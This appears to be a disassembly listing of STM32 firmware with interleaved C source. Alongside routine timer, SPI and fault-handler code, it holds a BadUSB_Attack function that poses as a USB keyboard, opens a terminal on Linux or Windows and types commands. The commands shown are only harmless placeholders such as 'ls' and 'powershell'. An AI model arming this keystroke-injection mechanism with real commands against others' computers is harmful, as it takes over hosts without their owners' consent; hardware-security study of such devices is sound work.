08000a64 <InterruptTrap>:

void InterruptTrap(int *InterruptFlag){
 8000a64:	b580      	push	{r7, lr}
 8000a66:	b082      	sub	sp, #8
 8000a68:	af00      	add	r7, sp, #0
 8000a6a:	6078      	str	r0, [r7, #4]
	if(*InterruptFlag == 1){
 8000a6c:	687b      	ldr	r3, [r7, #4]
 8000a6e:	681b      	ldr	r3, [r3, #0]
 8000a70:	2b01      	cmp	r3, #1
 8000a72:	d10f      	bne.n	8000a94 <InterruptTrap+0x30>
		*InterruptFlag = 0;
 8000a74:	687b      	ldr	r3, [r7, #4]
 8000a76:	2200      	movs	r2, #0
 8000a78:	601a      	str	r2, [r3, #0]
		//Trigger timer interrupt immediately by setting the value of the register
		TIM2->EGR |= TIM_EGR_UG;
 8000a7a:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000a7e:	695b      	ldr	r3, [r3, #20]
 8000a80:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000a84:	f043 0301 	orr.w	r3, r3, #1
 8000a88:	6153      	str	r3, [r2, #20]
		//Second entry interrupt
		MX_TIM2_Init();
 8000a8a:	f000 f9ef 	bl	8000e6c <MX_TIM2_Init>
		HAL_TIM_Base_Start_IT(&htim2);
 8000a8e:	4803      	ldr	r0, [pc, #12]	; (8000a9c <InterruptTrap+0x38>)
 8000a90:	f004 f938 	bl	8004d04 <HAL_TIM_Base_Start_IT>
	}
}
 8000a94:	bf00      	nop
 8000a96:	3708      	adds	r7, #8
 8000a98:	46bd      	mov	sp, r7
 8000a9a:	bd80      	pop	{r7, pc}
 8000a9c:	200002e4 	.word	0x200002e4

08000aa0 <BadUSB_Attack>:

void BadUSB_Attack(int type){//type = 0:Linux; type = 1:windows.
 8000aa0:	b590      	push	{r4, r7, lr}
 8000aa2:	f5ad 7d05 	sub.w	sp, sp, #532	; 0x214
 8000aa6:	af00      	add	r7, sp, #0
 8000aa8:	f507 7304 	add.w	r3, r7, #528	; 0x210
 8000aac:	f5a3 7303 	sub.w	r3, r3, #524	; 0x20c
 8000ab0:	6018      	str	r0, [r3, #0]
	if(type == 0){
 8000ab2:	f507 7304 	add.w	r3, r7, #528	; 0x210
 8000ab6:	f5a3 7303 	sub.w	r3, r3, #524	; 0x20c
 8000aba:	681b      	ldr	r3, [r3, #0]
 8000abc:	2b00      	cmp	r3, #0
 8000abe:	d129      	bne.n	8000b14 <BadUSB_Attack+0x74>
		uint8_t StartLinuxTerminal[3] = {130, 131, 'T'};
 8000ac0:	4a41      	ldr	r2, [pc, #260]	; (8000bc8 <BadUSB_Attack+0x128>)
 8000ac2:	f507 7303 	add.w	r3, r7, #524	; 0x20c
 8000ac6:	6812      	ldr	r2, [r2, #0]
 8000ac8:	4611      	mov	r1, r2
 8000aca:	8019      	strh	r1, [r3, #0]
 8000acc:	3302      	adds	r3, #2
 8000ace:	0c12      	lsrs	r2, r2, #16
 8000ad0:	701a      	strb	r2, [r3, #0]
		char AttackStr[256];
		strcpy(AttackStr, "ls\n\nexit\n\n");
 8000ad2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000ad6:	4a3d      	ldr	r2, [pc, #244]	; (8000bcc <BadUSB_Attack+0x12c>)
 8000ad8:	ca07      	ldmia	r2, {r0, r1, r2}
 8000ada:	c303      	stmia	r3!, {r0, r1}
 8000adc:	801a      	strh	r2, [r3, #0]
 8000ade:	3302      	adds	r3, #2
 8000ae0:	0c12      	lsrs	r2, r2, #16
 8000ae2:	701a      	strb	r2, [r3, #0]
		SimulateShortcutKey(StartLinuxTerminal, 3);
 8000ae4:	f507 7303 	add.w	r3, r7, #524	; 0x20c
 8000ae8:	2103      	movs	r1, #3
 8000aea:	4618      	mov	r0, r3
 8000aec:	f7ff ff24 	bl	8000938 <SimulateShortcutKey>
		HAL_Delay(1000);
 8000af0:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 8000af4:	f000 fb64 	bl	80011c0 <HAL_Delay>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000af8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000afc:	4618      	mov	r0, r3
 8000afe:	f7ff fb65 	bl	80001cc <strlen>
 8000b02:	4603      	mov	r3, r0
 8000b04:	4619      	mov	r1, r3
 8000b06:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b0a:	4a31      	ldr	r2, [pc, #196]	; (8000bd0 <BadUSB_Attack+0x130>)
 8000b0c:	4618      	mov	r0, r3
 8000b0e:	f7ff ff3f 	bl	8000990 <SimulateKeyStrokes>
	}else{    //test
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
}
 8000b12:	e053      	b.n	8000bbc <BadUSB_Attack+0x11c>
	}else if(type == 1){
 8000b14:	f507 7304 	add.w	r3, r7, #528	; 0x210
 8000b18:	f5a3 7303 	sub.w	r3, r3, #524	; 0x20c
 8000b1c:	681b      	ldr	r3, [r3, #0]
 8000b1e:	2b01      	cmp	r3, #1
 8000b20:	d136      	bne.n	8000b90 <BadUSB_Attack+0xf0>
		uint8_t StartWindowsTerminal[2] = {132, 'R'};
 8000b22:	f245 2384 	movw	r3, #21124	; 0x5284
 8000b26:	f8a7 3208 	strh.w	r3, [r7, #520]	; 0x208
		strcpy(AttackStr, "powershell\n");
 8000b2a:	f107 0308 	add.w	r3, r7, #8
 8000b2e:	4a29      	ldr	r2, [pc, #164]	; (8000bd4 <BadUSB_Attack+0x134>)
 8000b30:	ca07      	ldmia	r2, {r0, r1, r2}
 8000b32:	e883 0007 	stmia.w	r3, {r0, r1, r2}
		strcpy(AttackStr1, "ls -a\n\nexit\n");
 8000b36:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b3a:	4a27      	ldr	r2, [pc, #156]	; (8000bd8 <BadUSB_Attack+0x138>)
 8000b3c:	461c      	mov	r4, r3
 8000b3e:	4613      	mov	r3, r2
 8000b40:	cb0f      	ldmia	r3, {r0, r1, r2, r3}
 8000b42:	c407      	stmia	r4!, {r0, r1, r2}
 8000b44:	7023      	strb	r3, [r4, #0]
		SimulateShortcutKey(StartWindowsTerminal, 2);
 8000b46:	f507 7302 	add.w	r3, r7, #520	; 0x208
 8000b4a:	2102      	movs	r1, #2
 8000b4c:	4618      	mov	r0, r3
 8000b4e:	f7ff fef3 	bl	8000938 <SimulateShortcutKey>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000b52:	f107 0308 	add.w	r3, r7, #8
 8000b56:	4618      	mov	r0, r3
 8000b58:	f7ff fb38 	bl	80001cc <strlen>
 8000b5c:	4603      	mov	r3, r0
 8000b5e:	4619      	mov	r1, r3
 8000b60:	f107 0308 	add.w	r3, r7, #8
 8000b64:	4a1a      	ldr	r2, [pc, #104]	; (8000bd0 <BadUSB_Attack+0x130>)
 8000b66:	4618      	mov	r0, r3
 8000b68:	f7ff ff12 	bl	8000990 <SimulateKeyStrokes>
		HAL_Delay(1000);
 8000b6c:	f44f 707a 	mov.w	r0, #1000	; 0x3e8
 8000b70:	f000 fb26 	bl	80011c0 <HAL_Delay>
		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
 8000b74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b78:	4618      	mov	r0, r3
 8000b7a:	f7ff fb27 	bl	80001cc <strlen>
 8000b7e:	4603      	mov	r3, r0
 8000b80:	4619      	mov	r1, r3
 8000b82:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b86:	4a12      	ldr	r2, [pc, #72]	; (8000bd0 <BadUSB_Attack+0x130>)
 8000b88:	4618      	mov	r0, r3
 8000b8a:	f7ff ff01 	bl	8000990 <SimulateKeyStrokes>
}
 8000b8e:	e015      	b.n	8000bbc <BadUSB_Attack+0x11c>
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
 8000b90:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000b94:	4a11      	ldr	r2, [pc, #68]	; (8000bdc <BadUSB_Attack+0x13c>)
 8000b96:	4618      	mov	r0, r3
 8000b98:	4611      	mov	r1, r2
 8000b9a:	234e      	movs	r3, #78	; 0x4e
 8000b9c:	461a      	mov	r2, r3
 8000b9e:	f00c fa45 	bl	800d02c <memcpy>
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
 8000ba2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000ba6:	4618      	mov	r0, r3
 8000ba8:	f7ff fb10 	bl	80001cc <strlen>
 8000bac:	4603      	mov	r3, r0
 8000bae:	4619      	mov	r1, r3
 8000bb0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8000bb4:	4a06      	ldr	r2, [pc, #24]	; (8000bd0 <BadUSB_Attack+0x130>)
 8000bb6:	4618      	mov	r0, r3
 8000bb8:	f7ff feea 	bl	8000990 <SimulateKeyStrokes>
}
 8000bbc:	bf00      	nop
 8000bbe:	f507 7705 	add.w	r7, r7, #532	; 0x214
 8000bc2:	46bd      	mov	sp, r7
 8000bc4:	bd90      	pop	{r4, r7, pc}
 8000bc6:	bf00      	nop
 8000bc8:	0800d160 	.word	0x0800d160
 8000bcc:	0800d0e8 	.word	0x0800d0e8
 8000bd0:	20000278 	.word	0x20000278
 8000bd4:	0800d0f4 	.word	0x0800d0f4
 8000bd8:	0800d100 	.word	0x0800d100
 8000bdc:	0800d110 	.word	0x0800d110

08000be0 <HAL_TIM_PeriodElapsedCallback>:

void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim){
 8000be0:	b580      	push	{r7, lr}
 8000be2:	b082      	sub	sp, #8
 8000be4:	af00      	add	r7, sp, #0
 8000be6:	6078      	str	r0, [r7, #4]
	if(htim == &htim2){
 8000be8:	687b      	ldr	r3, [r7, #4]
 8000bea:	4a1d      	ldr	r2, [pc, #116]	; (8000c60 <HAL_TIM_PeriodElapsedCallback+0x80>)
 8000bec:	4293      	cmp	r3, r2
 8000bee:	d133      	bne.n	8000c58 <HAL_TIM_PeriodElapsedCallback+0x78>
		if(InterruptCnt == 0){
 8000bf0:	4b1c      	ldr	r3, [pc, #112]	; (8000c64 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000bf2:	681b      	ldr	r3, [r3, #0]
 8000bf4:	2b00      	cmp	r3, #0
 8000bf6:	d108      	bne.n	8000c0a <HAL_TIM_PeriodElapsedCallback+0x2a>
			//Simulate press operation
			Get_Single_Descriptor(128);
 8000bf8:	2080      	movs	r0, #128	; 0x80
 8000bfa:	f7ff fdb1 	bl	8000760 <Get_Single_Descriptor>
			USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 8000bfe:	220f      	movs	r2, #15
 8000c00:	4919      	ldr	r1, [pc, #100]	; (8000c68 <HAL_TIM_PeriodElapsedCallback+0x88>)
 8000c02:	481a      	ldr	r0, [pc, #104]	; (8000c6c <HAL_TIM_PeriodElapsedCallback+0x8c>)
 8000c04:	f007 feec 	bl	80089e0 <USBD_CUSTOM_HID_SendReport>
 8000c08:	e018      	b.n	8000c3c <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_SET);
		}else if(InterruptCnt == 1){
 8000c0a:	4b16      	ldr	r3, [pc, #88]	; (8000c64 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c0c:	681b      	ldr	r3, [r3, #0]
 8000c0e:	2b01      	cmp	r3, #1
 8000c10:	d10c      	bne.n	8000c2c <HAL_TIM_PeriodElapsedCallback+0x4c>
			//Simulate release operation
			SimulateKeyRelease();
 8000c12:	f7ff fe69 	bl	80008e8 <SimulateKeyRelease>
			//Judging whether to Interrupt
			if((recv_buffer[0]&0x02) != 0x02)
 8000c16:	4b16      	ldr	r3, [pc, #88]	; (8000c70 <HAL_TIM_PeriodElapsedCallback+0x90>)
 8000c18:	781b      	ldrb	r3, [r3, #0]
 8000c1a:	f003 0302 	and.w	r3, r3, #2
 8000c1e:	2b00      	cmp	r3, #0
 8000c20:	d10c      	bne.n	8000c3c <HAL_TIM_PeriodElapsedCallback+0x5c>
				InterruptCnt = -1;
 8000c22:	4b10      	ldr	r3, [pc, #64]	; (8000c64 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c24:	f04f 32ff 	mov.w	r2, #4294967295
 8000c28:	601a      	str	r2, [r3, #0]
 8000c2a:	e007      	b.n	8000c3c <HAL_TIM_PeriodElapsedCallback+0x5c>
//			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_RESET);
		}else{
			//off timer
			TIM2->CR1 &= ~TIM_CR1_CEN;
 8000c2c:	f04f 4380 	mov.w	r3, #1073741824	; 0x40000000
 8000c30:	681b      	ldr	r3, [r3, #0]
 8000c32:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000c36:	f023 0301 	bic.w	r3, r3, #1
 8000c3a:	6013      	str	r3, [r2, #0]
		}
		InterruptCnt = (InterruptCnt+1)%3;
 8000c3c:	4b09      	ldr	r3, [pc, #36]	; (8000c64 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c3e:	681b      	ldr	r3, [r3, #0]
 8000c40:	1c59      	adds	r1, r3, #1
 8000c42:	4b0c      	ldr	r3, [pc, #48]	; (8000c74 <HAL_TIM_PeriodElapsedCallback+0x94>)
 8000c44:	fb83 3201 	smull	r3, r2, r3, r1
 8000c48:	17cb      	asrs	r3, r1, #31
 8000c4a:	1ad2      	subs	r2, r2, r3
 8000c4c:	4613      	mov	r3, r2
 8000c4e:	005b      	lsls	r3, r3, #1
 8000c50:	4413      	add	r3, r2
 8000c52:	1aca      	subs	r2, r1, r3
 8000c54:	4b03      	ldr	r3, [pc, #12]	; (8000c64 <HAL_TIM_PeriodElapsedCallback+0x84>)
 8000c56:	601a      	str	r2, [r3, #0]
	}
}
 8000c58:	bf00      	nop
 8000c5a:	3708      	adds	r7, #8
 8000c5c:	46bd      	mov	sp, r7
 8000c5e:	bd80      	pop	{r7, pc}
 8000c60:	200002e4 	.word	0x200002e4
 8000c64:	20000274 	.word	0x20000274
 8000c68:	2000025c 	.word	0x2000025c
 8000c6c:	200003c0 	.word	0x200003c0
 8000c70:	2000026c 	.word	0x2000026c
 8000c74:	55555556 	.word	0x55555556

08000c78 <Error_Handler>:
/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
 8000c78:	b480      	push	{r7}
 8000c7a:	af00      	add	r7, sp, #0
  \details Disables IRQ interrupts by setting the I-bit in the CPSR.
           Can only be executed in Privileged modes.
 */
__STATIC_FORCEINLINE void __disable_irq(void)
{
  __ASM volatile ("cpsid i" : : : "memory");
 8000c7c:	b672      	cpsid	i
}
 8000c7e:	bf00      	nop
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
  __disable_irq();
  while (1)
 8000c80:	e7fe      	b.n	8000c80 <Error_Handler+0x8>
	...

08000c84 <MX_SPI1_Init>:

SPI_HandleTypeDef hspi1;

/* SPI1 init function */
void MX_SPI1_Init(void)
{
 8000c84:	b580      	push	{r7, lr}
 8000c86:	af00      	add	r7, sp, #0
  /* USER CODE END SPI1_Init 0 */

  /* USER CODE BEGIN SPI1_Init 1 */

  /* USER CODE END SPI1_Init 1 */
  hspi1.Instance = SPI1;
 8000c88:	4b1b      	ldr	r3, [pc, #108]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000c8a:	4a1c      	ldr	r2, [pc, #112]	; (8000cfc <MX_SPI1_Init+0x78>)
 8000c8c:	601a      	str	r2, [r3, #0]
  hspi1.Init.Mode = SPI_MODE_MASTER;
 8000c8e:	4b1a      	ldr	r3, [pc, #104]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000c90:	f44f 7282 	mov.w	r2, #260	; 0x104
 8000c94:	605a      	str	r2, [r3, #4]
  hspi1.Init.Direction = SPI_DIRECTION_2LINES;
 8000c96:	4b18      	ldr	r3, [pc, #96]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000c98:	2200      	movs	r2, #0
 8000c9a:	609a      	str	r2, [r3, #8]
  hspi1.Init.DataSize = SPI_DATASIZE_8BIT;
 8000c9c:	4b16      	ldr	r3, [pc, #88]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000c9e:	f44f 62e0 	mov.w	r2, #1792	; 0x700
 8000ca2:	60da      	str	r2, [r3, #12]
  hspi1.Init.CLKPolarity = SPI_POLARITY_LOW;
 8000ca4:	4b14      	ldr	r3, [pc, #80]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000ca6:	2200      	movs	r2, #0
 8000ca8:	611a      	str	r2, [r3, #16]
  hspi1.Init.CLKPhase = SPI_PHASE_1EDGE;
 8000caa:	4b13      	ldr	r3, [pc, #76]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000cac:	2200      	movs	r2, #0
 8000cae:	615a      	str	r2, [r3, #20]
  hspi1.Init.NSS = SPI_NSS_SOFT;
 8000cb0:	4b11      	ldr	r3, [pc, #68]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000cb2:	f44f 7200 	mov.w	r2, #512	; 0x200
 8000cb6:	619a      	str	r2, [r3, #24]
  hspi1.Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_64;
 8000cb8:	4b0f      	ldr	r3, [pc, #60]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000cba:	2228      	movs	r2, #40	; 0x28
 8000cbc:	61da      	str	r2, [r3, #28]
  hspi1.Init.FirstBit = SPI_FIRSTBIT_MSB;
 8000cbe:	4b0e      	ldr	r3, [pc, #56]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000cc0:	2200      	movs	r2, #0
 8000cc2:	621a      	str	r2, [r3, #32]
  hspi1.Init.TIMode = SPI_TIMODE_DISABLE;
 8000cc4:	4b0c      	ldr	r3, [pc, #48]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000cc6:	2200      	movs	r2, #0
 8000cc8:	625a      	str	r2, [r3, #36]	; 0x24
  hspi1.Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8000cca:	4b0b      	ldr	r3, [pc, #44]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000ccc:	2200      	movs	r2, #0
 8000cce:	629a      	str	r2, [r3, #40]	; 0x28
  hspi1.Init.CRCPolynomial = 7;
 8000cd0:	4b09      	ldr	r3, [pc, #36]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000cd2:	2207      	movs	r2, #7
 8000cd4:	62da      	str	r2, [r3, #44]	; 0x2c
  hspi1.Init.CRCLength = SPI_CRC_LENGTH_DATASIZE;
 8000cd6:	4b08      	ldr	r3, [pc, #32]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000cd8:	2200      	movs	r2, #0
 8000cda:	631a      	str	r2, [r3, #48]	; 0x30
  hspi1.Init.NSSPMode = SPI_NSS_PULSE_ENABLE;
 8000cdc:	4b06      	ldr	r3, [pc, #24]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000cde:	2208      	movs	r2, #8
 8000ce0:	635a      	str	r2, [r3, #52]	; 0x34
  if (HAL_SPI_Init(&hspi1) != HAL_OK)
 8000ce2:	4805      	ldr	r0, [pc, #20]	; (8000cf8 <MX_SPI1_Init+0x74>)
 8000ce4:	f003 ff14 	bl	8004b10 <HAL_SPI_Init>
 8000ce8:	4603      	mov	r3, r0
 8000cea:	2b00      	cmp	r3, #0
 8000cec:	d001      	beq.n	8000cf2 <MX_SPI1_Init+0x6e>
  {
    Error_Handler();
 8000cee:	f7ff ffc3 	bl	8000c78 <Error_Handler>
  }
  /* USER CODE BEGIN SPI1_Init 2 */

  /* USER CODE END SPI1_Init 2 */

}
 8000cf2:	bf00      	nop
 8000cf4:	bd80      	pop	{r7, pc}
 8000cf6:	bf00      	nop
 8000cf8:	20000280 	.word	0x20000280
 8000cfc:	40013000 	.word	0x40013000

08000d00 <HAL_SPI_MspInit>:

void HAL_SPI_MspInit(SPI_HandleTypeDef* spiHandle)
{
 8000d00:	b580      	push	{r7, lr}
 8000d02:	b08a      	sub	sp, #40	; 0x28
 8000d04:	af00      	add	r7, sp, #0
 8000d06:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000d08:	f107 0314 	add.w	r3, r7, #20
 8000d0c:	2200      	movs	r2, #0
 8000d0e:	601a      	str	r2, [r3, #0]
 8000d10:	605a      	str	r2, [r3, #4]
 8000d12:	609a      	str	r2, [r3, #8]
 8000d14:	60da      	str	r2, [r3, #12]
 8000d16:	611a      	str	r2, [r3, #16]
  if(spiHandle->Instance==SPI1)
 8000d18:	687b      	ldr	r3, [r7, #4]
 8000d1a:	681b      	ldr	r3, [r3, #0]
 8000d1c:	4a17      	ldr	r2, [pc, #92]	; (8000d7c <HAL_SPI_MspInit+0x7c>)
 8000d1e:	4293      	cmp	r3, r2
 8000d20:	d128      	bne.n	8000d74 <HAL_SPI_MspInit+0x74>
  {
  /* USER CODE BEGIN SPI1_MspInit 0 */

  /* USER CODE END SPI1_MspInit 0 */
    /* SPI1 clock enable */
    __HAL_RCC_SPI1_CLK_ENABLE();
 8000d22:	4b17      	ldr	r3, [pc, #92]	; (8000d80 <HAL_SPI_MspInit+0x80>)
 8000d24:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d26:	4a16      	ldr	r2, [pc, #88]	; (8000d80 <HAL_SPI_MspInit+0x80>)
 8000d28:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8000d2c:	6613      	str	r3, [r2, #96]	; 0x60
 8000d2e:	4b14      	ldr	r3, [pc, #80]	; (8000d80 <HAL_SPI_MspInit+0x80>)
 8000d30:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d32:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8000d36:	613b      	str	r3, [r7, #16]
 8000d38:	693b      	ldr	r3, [r7, #16]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000d3a:	4b11      	ldr	r3, [pc, #68]	; (8000d80 <HAL_SPI_MspInit+0x80>)
 8000d3c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000d3e:	4a10      	ldr	r2, [pc, #64]	; (8000d80 <HAL_SPI_MspInit+0x80>)
 8000d40:	f043 0301 	orr.w	r3, r3, #1
 8000d44:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000d46:	4b0e      	ldr	r3, [pc, #56]	; (8000d80 <HAL_SPI_MspInit+0x80>)
 8000d48:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000d4a:	f003 0301 	and.w	r3, r3, #1
 8000d4e:	60fb      	str	r3, [r7, #12]
 8000d50:	68fb      	ldr	r3, [r7, #12]
    /**SPI1 GPIO Configuration
    PA1     ------> SPI1_SCK
    PA6     ------> SPI1_MISO
    PA7     ------> SPI1_MOSI
    */
    GPIO_InitStruct.Pin = GPIO_PIN_1|GPIO_PIN_6|GPIO_PIN_7;
 8000d52:	23c2      	movs	r3, #194	; 0xc2
 8000d54:	617b      	str	r3, [r7, #20]
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8000d56:	2302      	movs	r3, #2
 8000d58:	61bb      	str	r3, [r7, #24]
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000d5a:	2300      	movs	r3, #0
 8000d5c:	61fb      	str	r3, [r7, #28]
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8000d5e:	2303      	movs	r3, #3
 8000d60:	623b      	str	r3, [r7, #32]
    GPIO_InitStruct.Alternate = GPIO_AF5_SPI1;
 8000d62:	2305      	movs	r3, #5
 8000d64:	627b      	str	r3, [r7, #36]	; 0x24
    HAL_GPIO_Init(GPIOA, &GPIO_InitStruct);
 8000d66:	f107 0314 	add.w	r3, r7, #20
 8000d6a:	4619      	mov	r1, r3
 8000d6c:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000d70:	f000 fdd4 	bl	800191c <HAL_GPIO_Init>

  /* USER CODE BEGIN SPI1_MspInit 1 */

  /* USER CODE END SPI1_MspInit 1 */
  }
}
 8000d74:	bf00      	nop
 8000d76:	3728      	adds	r7, #40	; 0x28
 8000d78:	46bd      	mov	sp, r7
 8000d7a:	bd80      	pop	{r7, pc}
 8000d7c:	40013000 	.word	0x40013000
 8000d80:	40021000 	.word	0x40021000

08000d84 <HAL_MspInit>:
/* USER CODE END 0 */
/**
  * Initializes the Global MSP.
  */
void HAL_MspInit(void)
{
 8000d84:	b480      	push	{r7}
 8000d86:	b083      	sub	sp, #12
 8000d88:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MspInit 0 */

  /* USER CODE END MspInit 0 */

  __HAL_RCC_SYSCFG_CLK_ENABLE();
 8000d8a:	4b0f      	ldr	r3, [pc, #60]	; (8000dc8 <HAL_MspInit+0x44>)
 8000d8c:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d8e:	4a0e      	ldr	r2, [pc, #56]	; (8000dc8 <HAL_MspInit+0x44>)
 8000d90:	f043 0301 	orr.w	r3, r3, #1
 8000d94:	6613      	str	r3, [r2, #96]	; 0x60
 8000d96:	4b0c      	ldr	r3, [pc, #48]	; (8000dc8 <HAL_MspInit+0x44>)
 8000d98:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8000d9a:	f003 0301 	and.w	r3, r3, #1
 8000d9e:	607b      	str	r3, [r7, #4]
 8000da0:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_PWR_CLK_ENABLE();
 8000da2:	4b09      	ldr	r3, [pc, #36]	; (8000dc8 <HAL_MspInit+0x44>)
 8000da4:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000da6:	4a08      	ldr	r2, [pc, #32]	; (8000dc8 <HAL_MspInit+0x44>)
 8000da8:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8000dac:	6593      	str	r3, [r2, #88]	; 0x58
 8000dae:	4b06      	ldr	r3, [pc, #24]	; (8000dc8 <HAL_MspInit+0x44>)
 8000db0:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000db2:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8000db6:	603b      	str	r3, [r7, #0]
 8000db8:	683b      	ldr	r3, [r7, #0]
  /* System interrupt init*/

  /* USER CODE BEGIN MspInit 1 */

  /* USER CODE END MspInit 1 */
}
 8000dba:	bf00      	nop
 8000dbc:	370c      	adds	r7, #12
 8000dbe:	46bd      	mov	sp, r7
 8000dc0:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000dc4:	4770      	bx	lr
 8000dc6:	bf00      	nop
 8000dc8:	40021000 	.word	0x40021000

08000dcc <NMI_Handler>:
/******************************************************************************/
/**
  * @brief This function handles Non maskable interrupt.
  */
void NMI_Handler(void)
{
 8000dcc:	b480      	push	{r7}
 8000dce:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN NonMaskableInt_IRQn 0 */

  /* USER CODE END NonMaskableInt_IRQn 0 */
  /* USER CODE BEGIN NonMaskableInt_IRQn 1 */
   while (1)
 8000dd0:	e7fe      	b.n	8000dd0 <NMI_Handler+0x4>

08000dd2 <HardFault_Handler>:

/**
  * @brief This function handles Hard fault interrupt.
  */
void HardFault_Handler(void)
{
 8000dd2:	b480      	push	{r7}
 8000dd4:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN HardFault_IRQn 0 */

  /* USER CODE END HardFault_IRQn 0 */
  while (1)
 8000dd6:	e7fe      	b.n	8000dd6 <HardFault_Handler+0x4>

08000dd8 <MemManage_Handler>:

/**
  * @brief This function handles Memory management fault.
  */
void MemManage_Handler(void)
{
 8000dd8:	b480      	push	{r7}
 8000dda:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MemoryManagement_IRQn 0 */

  /* USER CODE END MemoryManagement_IRQn 0 */
  while (1)
 8000ddc:	e7fe      	b.n	8000ddc <MemManage_Handler+0x4>

08000dde <BusFault_Handler>:

/**
  * @brief This function handles Prefetch fault, memory access fault.
  */
void BusFault_Handler(void)
{
 8000dde:	b480      	push	{r7}
 8000de0:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN BusFault_IRQn 0 */

  /* USER CODE END BusFault_IRQn 0 */
  while (1)
 8000de2:	e7fe      	b.n	8000de2 <BusFault_Handler+0x4>

08000de4 <UsageFault_Handler>:

/**
  * @brief This function handles Undefined instruction or illegal state.
  */
void UsageFault_Handler(void)
{
 8000de4:	b480      	push	{r7}
 8000de6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN UsageFault_IRQn 0 */

  /* USER CODE END UsageFault_IRQn 0 */
  while (1)
 8000de8:	e7fe      	b.n	8000de8 <UsageFault_Handler+0x4>

08000dea <SVC_Handler>:

/**
  * @brief This function handles System service call via SWI instruction.
  */
void SVC_Handler(void)
{
 8000dea:	b480      	push	{r7}
 8000dec:	af00      	add	r7, sp, #0

  /* USER CODE END SVCall_IRQn 0 */
  /* USER CODE BEGIN SVCall_IRQn 1 */

  /* USER CODE END SVCall_IRQn 1 */
}
 8000dee:	bf00      	nop
 8000df0:	46bd      	mov	sp, r7
 8000df2:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000df6:	4770      	bx	lr

08000df8 <DebugMon_Handler>:

/**
  * @brief This function handles Debug monitor.
  */
void DebugMon_Handler(void)
{
 8000df8:	b480      	push	{r7}
